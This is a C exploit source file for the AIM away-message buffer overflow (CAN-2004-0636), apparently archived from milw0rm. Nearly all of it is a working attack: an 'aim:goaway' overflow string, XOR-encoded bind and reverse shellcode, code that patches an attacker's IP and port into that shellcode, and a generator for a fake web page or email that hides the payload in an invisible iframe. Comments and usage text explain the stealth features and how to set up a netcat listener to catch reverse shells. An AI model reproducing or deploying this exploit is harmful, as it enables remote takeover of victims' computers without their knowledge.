/* CAN-2004-0636 */

/*
 * AIM Away Message Buffer Overflow Exploit
 *   Exploit by John Bissell A.K.A. HighT1mes
 *
 * Exploit: 
 * ========
 *   drizzit.c
 *
 * Vulnerable Software:
 * ====================
 *    - AIM 5.5.3588
 *    - AIM 5.5.3590 Beta
 *    - AIM 5.5.3591
 *    - AIM 5.5.3595
 *    and a couple others versions...
 *
 * If you want to try other return addressees for other versions of
 * AIM then edit the return address.. But the current one embedded 
 * will work for sure with all the AIM versions listed above.
 *
 * I used some of the metasploit shellcode for this exploit with some
 * modifications to get this into stealth mode so it is harder to 
 * detect the attack. Since I'm using metasploit shellcode that means this
 * exploit can be used on any NT type OS, like win2k, winnt, winxp across
 * any service pack.. I don't know about SP2 though I haven't tested
 * it yet.
 *
 * On a side note I pourposly did not include the download+exec shellcode
 * even though I have it because I'm sick and tired of these little
 * spam/adware bitchs messing peoples computers up for profit.. You can
 * still download/upload through the shell to the victim. It just 
 * isn't automated like download+exec would be.
 *
 * In my opinion the reverse connect (-r option) is the most dangerous
 * because you can encode your ip address and pick a port, and then 
 * when the victim visits the evil web page or email whatever.. then the
 * attack will automatically open his AIM even its not already open and
 * connect to you and then terminate the AIM process to be stealth so
 * the victim doesn't know what him them.. As I remind people in the
 * exploit usage you need to remember to use netcat to listen on a 
 * port you picked for the exploit to connect to...
 *
 * One reason I decided to include the generation of html code for 
 * this exploit is I noticed almost no puts small limits on the 
 * <IFRAME SRC=""> attribute. So when the victim connects to that
 * page or reads that email depending on the browser or client, 
 * The exploit will execute.. IE 6.0 and Mozilla are 
 * affected by this problem as well as Outlook Express when the
 * security settings are set to the Internet Zone.
 *
 * Excuse the sloppy commandline interface I just wanted to get
 * this out to the public. 
 *
 * [ Original advisory posted by Secunia and iDEFENSE. ]
 *
 * Greets:
 * =======
 *   IsolationX, YpCat, DaPhire, route, #romhack,
 *   Taylor Hayes, Aria Giovanni, Anthony Rocha,
 *   InVerse, Deltaflame, Jenna Jameson, iDENFENSE, 
 *   secunia, so1o, John Kerry, and many others...
 *
 * Compiler: 
 * =========
 *    Visual C++ 6.0
 *
 * To compile you first must add ws2_32.lib to the Object/librarys modules:
 * text box under the Project -> Settings menu; then click on the link tab...
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

/* Exploit Data */

char injection_vector[] =

                        "\x61\x69\x6D\x3A\x67\x6F\x61\x77\x61\x79\x3F\x6D\x65\x73\x73\x61"
                        "\x67\x65\x3D\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
                        "\x41\x41\x41\x41\x41\x41\x41\x41";

char bind_shellcode[] = 

                        "\xEB\x26\x23\x38\x3B\x41\x41"
                        "\x92\x0f\x29\x12\x41\x41\x41\x41\xD9\xE1\xD9\x34\x24\x58\x58\x58"
                        "\x58\x80\xE8\xE7\x31\xC9\x66\x81\xE9\x97\xFE\x80\x30\x92\x40\xE2"
                        "\xFA\x7A\xAA\x92\x92\x92\xD1\xDF\xD6\x92\x75\xEB\x54\xEB\x77\xDB"
                        "\x14\xDB\x36\x3F\xBC\x7B\x36\x88\xE2\x55\x4B\x9B\x67\x3F\x59\x7F"
                        "\x6E\xA9\x1C\xDC\x9C\x7E\xEC\x4A\x70\xE1\x3F\x4B\x97\x5C\xE0\x6C"
                        "\x21\x84\xC5\xC1\xA0\xCD\xA1\xA0\xBC\xD6\xDE\xDE\x92\x93\xC9\xC6"
                        "\x1B\x77\x1B\xCF\x92\xF8\xA2\xCB\xF6\x19\x93\x19\xD2\x9E\x19\xE2"
                        "\x8E\x3F\x19\xCA\x9A\x79\x9E\x1F\xC5\xBE\xC3\xC0\x6D\x42\x1B\x51"
                        "\xCB\x79\x82\xF8\x9A\xCC\x93\x7C\xF8\x98\xCB\x19\xEF\x92\x12\x6B"
                        "\x94\xE6\x76\xC3\xC1\x6D\xA6\x1D\x7A\x07\x92\x92\x92\xCB\x1B\x96"
                        "\x1C\x70\x79\xA3\x6D\xF4\x13\x7E\x02\x93\xC6\xFA\x93\x93\x92\x92"
                        "\x6D\xC7\xB2\xC5\xC5\xC5\xC5\xD5\xC5\xD5\xC5\x6D\xC7\x8E\x1B\x51"
                        "\xA3\x6D\xC5\xC5\xFA\x90\x92\xB0\x83\x1B\x74\xF8\x82\xC4\xC1\x6D"
                        "\xC7\x8A\xC5\xC1\x6D\xC7\x86\xC5\xC4\xC1\x6D\xC7\x82\x1B\x50\xF4"
                        "\x13\x7E\xC6\x92\x1F\xAE\xB6\xA3\x52\xF8\x87\xCB\x61\x39\x1B\x45"
                        "\x54\xD6\xB6\x82\xD6\xF4\x55\xD6\xB6\xAE\x93\x93\x1B\xEE\xB6\xDA"
                        "\x1B\xEE\xB6\xDE\x1B\xEE\xB6\xC2\x1F\xD6\xB6\x82\xC6\xC2\xC3\xC3"
                        "\xC3\xD3\xC3\xDB\xC3\xC3\x6D\xE7\x92\xC3\x6D\xC7\xA2\x1B\x73\x79"
                        "\x9C\xFA\x6D\x6D\x6D\x6D\x6D\xA3\x6D\xC7\xBE\xC5\x6D\xC7\x9E\x6D"
                        "\xC7\xBA\xC1\xC7\xC4\xC5\x19\xFE\xB6\x8A\x19\xD7\xAE\x19\xC6\x97"
                        "\xEA\x93\x78\x19\xD8\x8A\x19\xC8\xB2\x93\x79\x71\xA0\xDB\x19\xA6"
                        "\x19\x93\x7C\xA3\x6D\x6E\xA3\x52\x3E\xAA\x72\xE6\x95\x53\x5D\x9F"
                        "\x93\x55\x79\x60\xA9\xEE\xB6\x86\xE7\x73\x19\xC8\xB6\x93\x79\xF4"
                        "\x19\x9E\xD9\x19\xC8\x8E\x93\x79\x19\x96\x19\x93\x7A\x79\x90\xA3"
                        "\x52\x1B\x78\xCD\xCC\xCF\xC9\x50\x9A\x92\x65\x6D\x44\x58\x4F\x52";

char reverse_shellcode[] =
                         
                        "\xEB\x08\x41\x41\x92\x0f\x29\x12\x41\x41\x41\x41\xD9\xE1\xD9\x34"
                        "\x24\x58\x58\x58\x58\x80\xE8\xE7\x31\xC9\x66\x81\xE9\xAC\xFE\x80"
                        "\x30\x92\x40\xE2\xFA\x7A\xA2\x92\x92\x92\xD1\xDF\xD6\x92\x75\xEB"
                        "\x54\xEB\x7E\x6B\x38\xF2\x4B\x9B\x67\x3F\x59\x7F\x6E\xA9\x1C\xDC"
                        "\x9C\x7E\xEC\x4A\x70\xE1\x3F\x4B\x97\x5C\xE0\x6C\x21\x84\xC5\xC1"
                        "\xA0\xCD\xA1\xA0\xBC\xD6\xDE\xDE\x92\x93\xC9\xC6\x1B\x77\x1B\xCF"
                        "\x92\xF8\xA2\xCB\xF6\x19\x93\x19\xD2\x9E\x19\xE2\x8E\x3F\x19\xCA"
                        "\x9A\x79\x9E\x1F\xC5\xB6\xC3\xC0\x6D\x42\x1B\x51\xCB\x79\x82\xF8"
                        "\x9A\xCC\x93\x7C\xF8\x9A\xCB\x19\xEF\x92\x12\x6B\x96\xE6\x76\xC3"
                        "\xC1\x6D\xA6\x1D\x7A\x1A\x92\x92\x92\xCB\x1B\x96\x1C\x70\x79\xA3"
                        "\x6D\xF4\x13\x7E\x02\x93\xC6\xFA\x93\x93\x92\x92\x6D\xC7\x8A\xC5"
                        "\xC5\xC5\xC5\xD5\xC5\xD5\xC5\x6D\xC7\x86\x1B\x51\xA3\x6D\xFA\xDF"
                        "\xDF\xDF\xDF\xFA\x90\x92\xB0\x83\x1B\x73\xF8\x82\xC3\xC1\x6D\xC7"
                        "\x82\x17\x52\xE7\xDB\x1F\xAE\xB6\xA3\x52\xF8\x87\xCB\x61\x39\x54"
                        "\xD6\xB6\x82\xD6\xF4\x55\xD6\xB6\xAE\x93\x93\x1B\xCE\xB6\xDA\x1B"
                        "\xCE\xB6\xDE\x1B\xCE\xB6\xC2\x1F\xD6\xB6\x82\xC6\xC2\xC3\xC3\xC3"
                        "\xD3\xC3\xDB\xC3\xC3\x6D\xE7\x92\xC3\x6D\xC7\xBA\x1B\x73\x79\x9C"
                        "\xFA\x6D\x6D\x6D\x6D\x6D\xA3\x6D\xC7\xB6\xC5\x6D\xC7\x9E\x6D\xC7"
                        "\xB2\xC1\xC7\xC4\xC5\x19\xFE\xB6\x8A\x19\xD7\xAE\x19\xC6\x97\xEA"
                        "\x93\x78\x19\xD8\x8A\x19\xC8\xB2\x93\x79\x71\xA0\xDB\x19\xA6\x19"
                        "\x93\x7C\xA3\x6D\x6E\xA3\x52\x3E\xAA\x72\xE6\x95\x53\x5D\x9F\x93"
                        "\x55\x79\x60\xA9\xEE\xB6\x86\xE7\x73\x19\xC8\xB6\x93\x79\xF4\x19"
                        "\x9E\xD9\x19\xC8\x8E\x93\x79\x19\x96\x19\x93\x7A\x79\x90\xA3\x52"
                        "\x1B\x78\xCD\xCC\xCF\xC9\x50\x9A\x92\x65\x6D\x44\x58\x4F\x52";

/* Function Prototypes */

void print_usage(char *prog_name);
unsigned char xor_data(unsigned char byte);

/* Function Code */

int main(int argc, char *argv[])
{
	int i                           = 0;
	int raw_num                     = 0;
	unsigned long port              = 1337; /* default port for bind and reverse attacks
*/
	unsigned long encoded_port      = 0;
	unsigned long encoded_ip        = 0;
	unsigned char print_raw_exploit = 0;
	unsigned char attack_mode       = 2;    /* bind attack by default */
	char ip_addr[256];
	char exploit[2048];
	char str_num[16];
	char *p1, *p2;
	FILE *EXPLOIT_FP;
	char outfile[512];
	WSADATA wsa;




	if (argc < 2) print_usage(argv[0]);

	/* process commandline */
	for (i = 0; i < argc; i++) {
		if (argv[i][0] == '-') {
			switch (argv[i][1]) {
			case 'r':
				/* reverse connect */
				strncpy(ip_addr, argv[i+1], 20);
				attack_mode = 1;
				break;
			case 'b':
				/* bind */
				attack_mode = 2;
				break;
			case 'p':
				port = atoi(argv[i+1]);
				/* port */
				break;
			case 'o':
				print_raw_exploit = 1;
				break;
			case 'e':
				strncpy(outfile, argv[i+1], 256);
			}
		}
	}

  /* initialize the socket library */
  if (WSAStartup(MAKEWORD(1, 1), &wsa) == SOCKET_ERROR) {
    printf("Error: Winsock didn't initialize!\n");
    exit(-1);
  }

	/* build exploit */
	strncpy(exploit, injection_vector, strlen(injection_vector));
	exploit[strlen(injection_vector)+1]=0; // tack on NULL byte
	encoded_port = htonl(port);
	encoded_port += 2;
	if (attack_mode == 1) {
		/* reverse connect attack */
		reverse_shellcode[196] = (char) 0x90;
     	reverse_shellcode[197] = (char) 0x92;
		reverse_shellcode[198] = xor_data((char)((encoded_port >> 16) & 0xff));
		reverse_shellcode[199] = xor_data((char)((encoded_port >> 24) & 0xff));

		p1 = strchr(ip_addr, '.');
		strncpy(str_num, ip_addr, p1-ip_addr);
		raw_num = atoi(str_num);
		reverse_shellcode[191] = xor_data((char)raw_num);

		p2 = strchr(p1+1, '.');
		strncpy(str_num, ip_addr+(p1-ip_addr)+1, p2-p1);
		raw_num = atoi(str_num);
		reverse_shellcode[192] = xor_data((char)raw_num);

		p1 = strchr(p2+1, '.');
		strncpy(str_num, ip_addr+(p2-ip_addr)+1, p1-p2);
		raw_num = atoi(str_num);
		reverse_shellcode[193] = xor_data((char)raw_num);

		p2 = strrchr(ip_addr, '.');
		strncpy(str_num, p2+1, 5);
		raw_num = atoi(str_num);
		reverse_shellcode[194] = xor_data((char)raw_num);

		strncat(exploit, reverse_shellcode, sizeof(reverse_shellcode));
	}
	if (attack_mode == 2) {
		/* bind attack */
		bind_shellcode[204] = (char) 0x90;
     	bind_shellcode[205] = (char) 0x92;
		bind_shellcode[206] = xor_data((char)((encoded_port >> 16) & 0xff));
		bind_shellcode[207] = xor_data((char)((encoded_port >> 24) & 0xff));
		strncat(exploit, bind_shellcode, sizeof(bind_shellcode));
	}

	WSACleanup();

	/* output exploit */
	if (print_raw_exploit == 1) {
		printf("%s", exploit);
	}
	else {
		if ((EXPLOIT_FP = fopen(outfile, "w")) == NULL) {
			fprintf(stderr, "Error: Exploit file can't be created!\n");
			exit(-1);
		}

		fprintf(EXPLOIT_FP, "<html>\n");
		fprintf(EXPLOIT_FP, "<head>\n");
		fprintf(EXPLOIT_FP, "<title>Hey d00d!</title>\n");
		fprintf(EXPLOIT_FP, "</head>\n");
		fprintf(EXPLOIT_FP, "<body>\n");
		fprintf(EXPLOIT_FP, "Some fake web page or email...\n");
		fprintf(EXPLOIT_FP, "<iframe width=0 height=0 border=0 src=\"");
		fprintf(EXPLOIT_FP, "%s", exploit);
		fprintf(EXPLOIT_FP, "\">\n</iframe>\n");
		fprintf(EXPLOIT_FP, "</body>\n");
		fprintf(EXPLOIT_FP, "<html>\n");

		fclose(EXPLOIT_FP);

		/* im to lazy to make a macro for this banner :P */
		printf(" +-------------------------------------------------+\n");
		printf(" |  AIM Exploit by John Bissell A.K.A. HighT1mes   |\n");
		printf(" |    AIM Away Message Buffer Overflow Exploit     |\n");
		printf(" +-------------------------------------------------+\n\n");

		printf(" Exploit created!\n\n");

		printf(" Remember if you use the -r option to have netcat listening\n");
		printf(" on the port you are using for the attack so the victim will\n");
		printf(" be able to connect to you when exploited...\n\n");
		printf(" Example:\n");
		printf("\tnc.exe -l -p %d", port);
	}

	return(EXIT_SUCCESS);
}

void print_usage(char *prog_name)
{
	printf(" +-------------------------------------------------+\n");
	printf(" |  AIM Exploit by John Bissell A.K.A. HighT1mes   |\n");
	printf(" |    AIM Away Message Buffer Overflow Exploit     |\n");
	printf(" +-------------------------------------------------+\n\n");
	printf(" Exploit Usage:\n");
	printf("\t%s -r your_ip | -b [-p port] -o | -e outfile\n\n", prog_name);
	printf(" Parameters:\n");
	printf("\t-r your_ip or -b\t Choose -r for reverse connect attack mode\n\t\t\t\t
and choose -b for a bind attack. By default\n\t\t\t\t if you don't specify -r or
-b then a bind\n\t\t\t\t attack will be generated.\n\n");
	printf("\t-p (optional)\t\t This option will allow you to change the port \n\t\t\t\t
used for a bind or reverse connect attack.\n\t\t\t\t If the attack mode is bind
then  the\n\t\t\t\t victim will open the -p port. If the attack\n\t\t\t\t mode
is reverse connect  then the port you\n\t\t\t\t specify will be the one you want
to listen\n\t\t\t\t on so the victim can  connect to you\n\t\t\t\t right away.\n\n");
	printf("\t-o or -e outfile\t\t Here you specify the output method...\n\t\t\t\t If
you would like output go straight to\n\t\t\t\t standerd output then specify the
-o option\n\t\t\t\t otherwise give the path of where you want to\n\t\t\t\t create
the exploit file which is basically\n\t\t\t\t a simple html file. The -o option
is useful if\n\t\t\t\t you want to test the exploit url in\n\t\t\t\t different
ways.\n\n");
	printf(" Examples:\n");
	printf("\t%s -r 68.6.47.62 -p 8888 -e c:\\exploit.html\n", prog_name);
	printf("\t%s -b -p 1542 -e c:\\new_exploit.html\n", prog_name);
	printf("\t%s -b -o\n", prog_name);
	printf("\t%s -r 68.6.47.62 -o\n\n", prog_name);
	printf(" Remember if you use the -r option to have netcat listening\n");
	printf(" on the port you are using for the attack so the victim will\n");
	printf(" be able to connect to you when exploited...\n\n");
	printf(" Example:\n");
	printf("\tnc.exe -l -p 8888");
	exit(-1);
}

unsigned char xor_data(unsigned char byte)
{
	return(byte ^ 0x92);
}

// milw0rm.com [2004-09-02]
